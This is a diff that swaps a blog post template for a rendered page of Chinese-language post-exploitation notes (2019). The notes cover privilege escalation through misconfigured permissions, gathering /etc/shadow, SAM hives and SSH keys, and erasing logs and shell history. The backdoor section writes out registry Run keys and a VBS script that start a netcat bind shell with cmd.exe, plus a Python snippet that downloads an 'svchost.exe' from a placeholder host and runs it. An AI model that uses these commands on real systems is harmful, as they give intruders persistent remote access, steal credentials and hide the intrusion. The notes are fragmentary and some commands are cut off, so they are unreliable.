@@ -1,107 +1,118 @@
-extends includes/layout.pug
-
-block top_img
-  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
-  if (top_img && page.top_img !== false)
-    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
-    - var flag = top_img === true ? 'no-bg' : ''
-    div#top-container(style=bg_img class=flag)
-      include ./includes/header.pug
-      #post-info
-        #post-title= page.title || _p('no_title')
-        #post-meta
-          if (theme.post_meta.date_type)
-            if (theme.post_meta.date_type === 'both')
-              time.post-meta__date
-                i.fa.fa-calendar(aria-hidden="true")
-                =' '+_p('post.created')+' '+date(page.date, config.date_format)
-                span.post-meta__separator |
-                i.fa.fa-calendar-check-o(aria-hidden="true")
-                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
-            else
-              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
-              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
-          if (theme.post_meta.categories && page.categories.data.length > 0)
-            if (theme.post_meta.date_type)
-              span.post-meta__separator |
-            each item, index in page.categories.data
-              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
-              a(href=url_for(item.path)).post-meta__categories #[=item.name]
-              if (index < page.categories.data.length - 1)
-                 i.fa.fa-angle-right(aria-hidden="true")
-          if (theme.disqus.enable && theme.disqus.count)
-            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
-              span.post-meta__separator |
-            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
-            a(href=url_for(page.path) + '#disqus_thread')
-              span.disqus-comment-count(data-disqus-identifier=page.path)
-          if (theme.wordcount && theme.wordcount.enable)
-            .post-meta-wordcount
-              span= _p('post.wordcount') + ': '
-              span.word-count= wordcount(page.content)
-              span.post-meta__separator |
-              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
-  else
-    div#top-container.plain
-      include ./includes/header.pug
-
-block content
-  article#post(class="")
-    if (!top_img)
-      #post-title.plain= page.title || _p('no_title')
-      #post-meta
-        if (theme.post_meta.date_type)
-          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
-          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
-        if (theme.post_meta.categories && page.categories.data.length > 0)
-          if (theme.post_meta.date_type)
-            span.post-meta__separator |
-          each item, index in page.categories.data
-            i.fa.fa-inbox(aria-hidden="true")
-            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
-            if (index < page.categories.data.length - 1)
-                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
-        if (theme.disqus.enable && theme.disqus.count)
-          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
-            span.post-meta__separator |
-          i.fa.fa-comment-o(aria-hidden="true")
-          a(href=url_for(page.path) + '#disqus_thread')
-            span.disqus-comment-count(data-disqus-identifier=page.path)
-        if (theme.wordcount && theme.wordcount.enable)
-          span.post-meta__separator |
-          span.post-meta-wordcount
-            span= _p('post.wordcount') + ': '
-            span.word-count= wordcount(page.content)
-            span.post-meta__separator |
-            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
-    #post-content.article-container!= page.content
-  if (theme.post_copyright && theme.post_copyright.enable)
-    .post-copyright
-      .post-copyright__author
-        span.post-copyright-meta= _p('post.copyright.author') + ": "
-        span.post-copyright-info
-          a(href=`mailto:${config.email}`) #[=config.author]
-      .post-copyright__type
-        span.post-copyright-meta= _p('post.copyright.link') + ": "
-        span.post-copyright-info
-          a(href=url_for(page.permalink)) #[=page.permalink]
-      .post-copyright__notice
-        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
-        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
-  if (theme.post_meta.tags)
-    .post-meta__tag-list
-      each item, index in page.tags.data
-        a(href=url_for(item.path)).post-meta__tags #[=item.name]
-  if (theme.QR_code)
-    if (theme.QR_code.length > 0)
-      .post-qr-code
-        each item in theme.QR_code
-          .post-qr-code-item
-            img.post-qr-code__img(src=(item.itemlist||item).img)
-            .post-qr-code__desc=(item.itemlist||item).text
-  include includes/share/index.pug
-  include includes/pagination.pug
-  if (theme.adv && theme.adv.enable)
-    .post-adv!= theme.adv.info
-  if page.comments !== false
-    include includes/comments/index.pug
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="利用配置不当提权"><meta name="keywords" content><meta name="author" content="starjian"><meta name="copyright" content="starjian"><title>利用配置不当提权 | 星晴</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用配置不当提权-后渗透测试"><span class="toc-number">1.</span> <span class="toc-text">利用配置不当提权,后渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-利用条件"><span class="toc-number">1.1.</span> <span class="toc-text">0x01  利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-命令行下快速发现不当配置"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 命令行下快速发现不当配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-icals-windows"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.  icals:(windows)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用配置不当提权"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 利用配置不当提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应用系统的配置文件"><span class="toc-number">1.3.1.</span> <span class="toc-text">应用系统的配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-信息收集"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-linux基本的信息收集"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.linux基本的信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-windows下的信息收集"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.windows下的信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux收集敏感信息"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.linux收集敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-windows敏感信息收集"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.windows敏感信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-隐藏痕迹"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 隐藏痕迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-放置隐藏后门"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 放置隐藏后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-添加到自启项"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">1.添加到自启项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-vbs脚本"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">2.vbs脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-python"><span class="toc-number">1.6.0.3.</span> <span class="toc-text">3.python</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">starjian</div><div class="author-info__description text-center">白帽子星晴的成长记录博客</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">13</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">星晴</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">利用配置不当提权</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-17</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="利用配置不当提权-后渗透测试"><a href="#利用配置不当提权-后渗透测试" class="headerlink" title="利用配置不当提权,后渗透测试"></a>利用配置不当提权,后渗透测试</h1><h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01  利用条件"></a>0x01  利用条件</h2><ul>
+<li><p>权限分配不当，编写的软件直接是用system权限运行的，一些服务是以system运行的，如果可以替换文件为恶意的代码，然后服务启动的时候就会反弹回一个root的shell</p>
+</li>
+<li><p>找到一些默认system执行的服务，尝试替换启动服务的执行程序。</p>
+</li>
+<li>NTFS权限允许users修改删除</li>
+</ul>
+<h2 id="0x02-命令行下快速发现不当配置"><a href="#0x02-命令行下快速发现不当配置" class="headerlink" title="0x02 命令行下快速发现不当配置"></a>0x02 命令行下快速发现不当配置</h2><h3 id="1-icals-windows"><a href="#1-icals-windows" class="headerlink" title="1.  icals:(windows)"></a>1.  icals:(windows)</h3><p><code>icacls C:\windows\*.exe /save perm /T</code>   save成perm文件名，且循环遍历windows目录</p>
+<p>BU是普通users组，PU是powersuser组权限，查找文件下的FA::BU</p>
+<p><code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>  编译成exe程序。 </p>
+<p>2.Find:(linux)</p>
+<p><code>find / -perm 777 -exec ls -l {} \;</code></p>
+<p> -perm指定权限</p>
+<h2 id="0x03-利用配置不当提权"><a href="#0x03-利用配置不当提权" class="headerlink" title="0x03 利用配置不当提权"></a>0x03 利用配置不当提权</h2><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a><strong>应用系统的配置文件</strong></h3><ul>
+<li>应用连接数据库的配置文件</li>
+<li>后台服务运行账号</li>
+</ul>
+<h2 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04 信息收集"></a>0x04 信息收集</h2><h3 id="1-linux基本的信息收集"><a href="#1-linux基本的信息收集" class="headerlink" title="1.linux基本的信息收集"></a>1.linux基本的信息收集</h3><p> <img src="/.com//1563365430694.png" alt="1563365430694"></p>
+<p>第一个是dns配置文件，做dns的劫持</p>
+<p>shadow是用户名的密码，离线破解密码</p>
+<h3 id="2-windows下的信息收集"><a href="#2-windows下的信息收集" class="headerlink" title="2.windows下的信息收集"></a>2.windows下的信息收集</h3><p><img src="/.com//1563365691394.png" alt="1563365691394"></p>
+<p>  net share 开启一个共享，把c盘共享无限制。</p>
+<p>域管理员将其激活。</p>
+<p><img src="/.com//1563366041513.png" alt="1563366041513"></p>
+<p>WMIC执行普通命令行无法执行的命令。</p>
+<p>第一个读取mac和ip</p>
+<p><img src="/.com//1563366249277.png" alt="1563366249277"></p>
+<p>查看当前系统的进程。</p>
+<p><img src="/.com//1563366345007.png" alt="1563366345007"></p>
+<p>结束calc.exe的进程</p>
+<p><img src="/.com//1563366442364.png" alt="1563366442364"></p>
+<p>得到系统安装的软件的版本以及名字</p>
+<p><img src="/.com//1563366507692.png" alt="1563366507692"></p>
+<p>删除杀毒软件在后台偷偷删掉：</p>
+<p><img src="/.com//1563366526660.png" alt="1563366526660"></p>
+<p>查看共享文件夹</p>
+<p><img src="/.com//1563366556772.png" alt="1563366556772"></p>
+<p>开启远程3389桌面</p>
+<p><img src="/.com//1563366583781.png" alt="1563366583781"></p>
+<p>machinename修改为localhost</p>
+<p>查看日志：</p>
+<p><img src="/.com//1563366679612.png" alt="1563366679612"></p>
+<h3 id="3-linux收集敏感信息"><a href="#3-linux收集敏感信息" class="headerlink" title="3.linux收集敏感信息"></a>3.linux收集敏感信息</h3><p> linux下:</p>
+<ul>
+<li><p>/etc: 大量的配置文件  </p>
+</li>
+<li><p>/etc/local/etc</p>
+</li>
+<li><p>/etc/passwd</p>
+</li>
+<li><p>/etc/shadow</p>
+</li>
+<li><p>.ssh；.gnupg  一般都是隐藏的使用ls -la显示出.   .ssh存在已经登录过的ssh密钥</p>
+</li>
+<li><p>业务数据库</p>
+</li>
+<li><p>e-mail 身份认证服务器数据库</p>
+</li>
+<li><p>/tmp 临时目录存放临时数据</p>
+</li>
+</ul>
+<h3 id="4-windows敏感信息收集"><a href="#4-windows敏感信息收集" class="headerlink" title="4.windows敏感信息收集"></a>4.windows敏感信息收集</h3><ul>
+<li>Sam数据库；注册表文件 </li>
+<li>%SYSTEMROOT%\repair\SAM sam修复时候保存的副本</li>
+<li>%SYSTEMROOT%\System32\config\RegBack\Sam</li>
+<li>业务数据库</li>
+<li>临时文件目录</li>
+<li>userProfile\APPData\Local\Microsoft\windows\Temporart internet Files\</li>
+</ul>
+<h2 id="0x05-隐藏痕迹"><a href="#0x05-隐藏痕迹" class="headerlink" title="0x05 隐藏痕迹"></a>0x05 隐藏痕迹</h2><ul>
+<li>禁止在登录界面显示新建账号</li>
+</ul>
+<p><img src="/.com//1563367503819.png" alt="1563367503819"></p>
+<ul>
+<li><p>删除日志文件</p>
+<p><img src="/.com//1563367630425.png" alt="1563367630425"></p>
+</li>
+<li><p>History  history -c清除</p>
+</li>
+<li><p>lsattr 查看文件的权限</p>
+</li>
+<li><p>chattr +i .bash_history  历史命令不会添加在bash历史文件中 先删除再创建在加i</p>
+</li>
+<li><p>日志</p>
+<p>auth.log/secure 登录日志</p>
+<p>btmp/wtmp 数据文件 last查看历史登录信息 lastb </p>
+<p>lastlog faillog  /var/log</p>
+</li>
+</ul>
+<ul>
+<li>其他日志和HIDS等</li>
+</ul>
+<h2 id="0x06-放置隐藏后门"><a href="#0x06-放置隐藏后门" class="headerlink" title="0x06 放置隐藏后门"></a>0x06 放置隐藏后门</h2><h4 id="1-添加到自启项"><a href="#1-添加到自启项" class="headerlink" title="1.添加到自启项"></a>1.添加到自启项</h4><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AUTORUN /t</code><br><code>REG_SZ /d &#39;C:\svchost.exe /f</code></p>
+<ul>
+<li>下载nc.exe到目录\system32\nc.exe</li>
+<li><p><code>reg add &quot;HKLM\software\microsoft\windows\currentversion\run&quot; /f /v &quot;system&quot; /t REG_SZ</code><br><code>/d &quot;C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe&quot;</code></p>
+</li>
+<li><p>接受反弹的shell</p>
+</li>
+</ul>
+<p>​        <code>nc -nv 目标机器端口</code></p>
+<h4 id="2-vbs脚本"><a href="#2-vbs脚本" class="headerlink" title="2.vbs脚本"></a>2.vbs脚本</h4><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> objShell</span><br><span class="line"><span class="keyword">Set</span> objShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.shell"</span>)</span><br><span class="line">objShell.run <span class="string">"C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe"</span></span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="literal">Nothing</span></span><br><span class="line">vbs</span><br></pre></td></tr></table></figure>
+<h4 id="3-python"><a href="#3-python" class="headerlink" title="3.python"></a>3.python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exe = <span class="string">'http://dwiadwaad/svchost.exe'</span></span><br><span class="line">r = requests.get(exe)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>): <span class="comment"># if_muma.exe_exists</span></span><br><span class="line">os.popen(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>) <span class="comment">#exec_muma.exe</span></span><br></pre></td></tr></table></figure>
+<p><code>attrib +a +b +r +h</code> 隐藏文件的操作</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">starjian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/07/17/li-yong-pei-zhi-bu-dang-ti-quan/">http://yoursite.com/2019/07/17/li-yong-pei-zhi-bu-dang-ti-quan/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/07/17/mysql-ti-quan-bi-ji/"><i class="fa fa-chevron-left">  </i><span>mysql提权笔记</span></a></div><div class="next-post pull-right"><a href="/2019/07/15/zhan-he-dui-lie-suan-fa-ti/"><span>栈和队列算法题</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By starjian</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
